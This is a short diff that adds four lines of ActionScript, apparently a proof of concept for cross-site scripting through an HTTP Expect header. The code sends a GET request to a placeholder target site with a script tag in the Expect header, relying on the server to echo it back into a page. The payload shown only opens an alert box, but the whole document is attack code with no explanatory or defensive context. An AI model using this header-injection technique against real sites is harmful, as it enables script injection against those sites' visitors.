@@ -1,0 +1,4 @@
+var req:LoadVars=new LoadVars();
+req.addRequestHeader("Expect",
+"<script>alert('gotcha!')</script>");
+req.send("http://www.target.site/","_blank","GET");
